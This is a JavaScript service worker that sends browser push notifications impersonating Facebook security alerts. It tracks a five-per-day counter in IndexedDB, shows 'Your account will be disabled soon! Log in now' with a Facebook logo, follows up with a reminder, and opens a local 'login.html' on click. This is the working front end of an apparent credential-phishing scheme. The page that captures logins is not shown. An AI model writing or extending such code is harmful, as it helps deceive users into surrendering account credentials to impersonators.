let reminderTimeoutId;
const DB_NAME = 'NotificationDB';
const STORE_NAME = 'notification_stats';

// Helper function to open IndexedDB
function openDB() {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open(DB_NAME, 1);
    request.onupgradeneeded = event => {
      const db = event.target.result;
      if (!db.objectStoreNames.contains(STORE_NAME)) {
        db.createObjectStore(STORE_NAME, { keyPath: 'id' });
      }
    };
    request.onsuccess = event => resolve(event.target.result);
    request.onerror = event => reject(event.target.error);
  });
}

// Helper to get notification stats
async function getStats() {
  const db = await openDB();
  return new Promise((resolve) => {
    const transaction = db.transaction(STORE_NAME, 'readonly');
    const store = transaction.objectStore(STORE_NAME);
    const request = store.get('daily_counter');
    request.onsuccess = () => {
      resolve(request.result || { id: 'daily_counter', count: 0, lastReset: Date.now() });
    };
  });
}

// Helper to update notification stats
async function updateStats(stats) {
  const db = await openDB();
  return new Promise((resolve) => {
    const transaction = db.transaction(STORE_NAME, 'readwrite');
    const store = transaction.objectStore(STORE_NAME);
    store.put(stats);
    transaction.oncomplete = () => resolve();
  });
}

// Listen for messages from the main script
self.addEventListener('message', async (event) => {
  if (event.data && event.data.action === 'scheduleNotifications') {
    let stats = await getStats();
    const oneDay = 24 * 60 * 60 * 1000;

    // Reset count if a day has passed
    if (Date.now() - stats.lastReset > oneDay) {
      stats.count = 0;
      stats.lastReset = Date.now();
    }

    // Check if daily limit is reached
    if (stats.count >= 5) {
      console.log('Daily notification limit (5) reached.');
      return;
    }

    // Increment count and save
    stats.count++;
    await updateStats(stats);
    console.log(`Notification count for today: ${stats.count}`);

    // 1. Schedule the first notification after 10 seconds
    setTimeout(() => {
      showFirstNotification();

      // 2. Schedule the reminder notification after 1 minute (60 seconds)
      reminderTimeoutId = setTimeout(() => {
        showReminderNotification();
      }, 60000); // 60 seconds

    }, 10000); // 10 seconds
  }
});

function showFirstNotification() {
  self.registration.showNotification('⚠️ Facebook Security Alert!', {
    body: 'Your account will be disabled soon! Log in now to avoid permanent block.',
    icon: 'facebook logo.png',
    data: { url: 'login.html' },
    tag: 'initial-fb-warning' // Unique tag for the first notification
  });
}

function showReminderNotification() {
  self.registration.showNotification('⏰ Reminder: Account Security', {
    body: 'Your account is still at risk. Please log in immediately to secure it.',
    icon: 'facebook logo.png',
    data: { url: 'login.html' },
    tag: 'reminder-fb-warning' // Unique tag for the reminder
  });
}

// Listen for notification click
self.addEventListener('notificationclick', function(event) {
  // Clear the reminder timeout if any notification is clicked
  if (reminderTimeoutId) {
    clearTimeout(reminderTimeoutId);
  }
  
  const urlToOpen = event.notification.data.url;
  event.notification.close();

  event.waitUntil(
    clients.matchAll({ type: 'window', includeUncontrolled: true }).then(clientList => {
      for (const client of clientList) {
        if (client.url === self.location.origin + '/' + urlToOpen && 'focus' in client) {
          return client.focus();
        }
      }
      if (clients.openWindow) {
        return clients.openWindow(urlToOpen);
      }
    })
  );
});

// Listen for notification close (if user dismisses it)
self.addEventListener('notificationclose', function(event) {
  if (event.notification.tag === 'initial-fb-warning') {
    // If the first notification is closed, cancel the reminder
    if (reminderTimeoutId) {
      clearTimeout(reminderTimeoutId);
      console.log('Initial notification closed. Reminder cancelled.');
    }
  }
});

// Ensure the new Service Worker activates immediately
self.addEventListener('install', () => {
  self.skipWaiting();
});